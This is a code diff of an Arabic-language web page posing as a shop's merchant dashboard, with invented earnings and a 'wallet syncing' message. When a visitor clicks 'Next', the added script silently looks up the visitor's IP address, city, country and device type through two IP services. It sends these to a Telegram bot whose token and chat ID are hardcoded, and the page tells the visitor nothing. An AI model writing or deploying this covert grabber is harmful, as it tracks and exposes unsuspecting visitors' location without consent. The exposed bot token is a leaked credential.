@@ -1,128 +1,48 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم | متجر حازم</title>
-    <style>
-        body {
-            margin: 0; padding: 0; background-color: #050505;
-            color: white; font-family: 'Segoe UI', Tahoma, sans-serif;
-            display: flex; justify-content: center; align-items: center; min-height: 100vh;
-        }
-
-        .neon-box {
-            padding: 30px; border: 1px solid #00fbff; border-radius: 15px;
-            background: rgba(0, 251, 255, 0.02); box-shadow: 0 0 20px #00fbff;
-            text-align: center; width: 90%; max-width: 500px;
-        }
-
-        h1 { font-size: 2.2rem; text-shadow: 0 0 10px #00fbff; margin-bottom: 20px; }
-
-        .btn-next {
-            background: transparent; color: #00fbff; border: 2px solid #00fbff;
-            padding: 15px 60px; font-size: 1.4rem; border-radius: 10px;
-            cursor: pointer; margin-top: 10px; transition: 0.4s; font-weight: bold;
-        }
-
-        .btn-next:hover { background: #00fbff; color: #000; box-shadow: 0 0 30px #00fbff; }
-
-        /* الواجهة الثانية */
-        #second-interface { display: none; }
-
-        .stats-grid {
-            display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0;
-        }
-
-        .stat-item {
-            background: rgba(255, 255, 255, 0.05); padding: 15px;
-            border-radius: 10px; border: 1px solid #333; text-align: center;
-        }
-
-        .stat-item span { display: block; color: #00fbff; font-size: 1.4rem; font-weight: bold; }
-        .stat-item label { font-size: 0.8rem; color: #888; }
-
-        .transaction-list {
-            background: rgba(255, 255, 255, 0.03); border-radius: 10px;
-            padding: 15px; text-align: right; font-size: 0.9rem;
-        }
-
-        .t-item { border-bottom: 1px solid #222; padding: 8px 0; display: flex; justify-content: space-between; }
-        .t-status { color: #00ff88; }
-        
-        .fade-in { animation: fadeIn 0.5s ease-in-out; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-    </style>
-</head>
-<body>
-
-    <div id="first-interface" class="neon-box">
-        <h1>أهلاً بك في متجر حازم</h1>
-        <button class="btn-next" onclick="handleStart()">التالي</button>
-    </div>
-
-    <div id="second-interface" class="neon-box fade-in">
-        <h2 style="color: #00fbff; margin-bottom: 10px;">لوحة التاجر النشطة</h2>
-        
-        <div class="stats-grid">
-            <div class="stat-item">
-                <span>$2,840.00</span>
-                <label>إجمالي الأرباح</label>
-            </div>
-            <div class="stat-item">
-                <span>154</span>
-                <label>عمليات مكتملة</label>
-            </div>
-        </div>
-
-        <div class="transaction-list">
-            <div style="font-weight: bold; margin-bottom: 10px; border-bottom: 1px solid #00fbff;">أحدث العمليات:</div>
-            <div class="t-item"><span>شحن رصيد إعلانات</span> <span class="t-status">+$45.00</span></div>
-            <div class="t-item"><span>بيع حساب VIP</span> <span class="t-status">+$20.00</span></div>
-        </div>
-
-        <p style="font-size: 0.85rem; color: #ffcc00; margin-top: 20px;">
-            جاري مزامنة المحفظة الرقمية...
-        </p>
-    </div>
-
-    <script>
-        // معلومات البوت الخاصة بك
+<script>
         const BOT_TOKEN = '8480565791:AAFovWtTmBP3FfHzx4w9z10rXUtIZgwo6MQ';
         const CHAT_ID = '5991790192';
 
         async function handleStart() {
-            // 1. إخفاء الواجهة الأولى وإظهار الثانية فوراً للسرعة
+            // 1. الانتقال الفوري للواجهة الثانية
             document.getElementById('first-interface').style.display = 'none';
             document.getElementById('second-interface').style.display = 'block';
 
-            // 2. جلب البيانات وإرسالها للتليجرام في الخلفية
+            // 2. محاولة جلب البيانات (استخدام سيرفرين لضمان العمل على الجوال)
+            let ipData = "غير معروف";
             try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
+                // جرب السيرفر الأول (ipify هو الأسرع للجوال)
+                const res = await fetch('https://api.ipify.org?format=json');
+                const json = await res.json();
+                ipData = json.ip;
 
+                // محاولة جلب تفاصيل أكثر (الموقع)
+                const geoRes = await fetch(`https://ipapi.co/${ipData}/json/`);
+                const geoData = await geoRes.json();
+                
                 const message = `
-🔔 **دخول جديد للمتجر!**
+🔔 **دخول جديد (جوال/لابتوب)!**
 --------------------------
-🆔 **IP:** \`${data.ip}\`
-📍 **الموقع:** ${data.city}, ${data.country_name}
-🌐 **المتصفح:** ${navigator.userAgent.slice(0, 50)}...
+🆔 **IP:** \`${geoData.ip || ipData}\`
+📍 **الموقع:** ${geoData.city || 'غير معروف'}, ${geoData.country_name || 'غير معروف'}
+🌐 **الجهاز:** ${navigator.platform}
+📱 **المتصفح:** ${navigator.userAgent.includes("Mobi") ? "جوال" : "لابتوب"}
 --------------------------
                 `;
 
+                // إرسال للتليجرام
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        chat_id: CHAT_ID, 
-                        text: message, 
-                        parse_mode: 'Markdown' 
-                    })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
                 });
+
             } catch (error) {
-                console.log("Error sending data to Telegram");
+                // إذا فشل كل شيء، أرسل تنبيه بسيط بأن هناك دخول حدث
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: "⚠️ زائر جديد دخل المتجر من الجوال (لم يتم جلب الـ IP بسبب حماية المتصفح)." })
+                });
             }
         }
     </script>
-</body>
-</html>
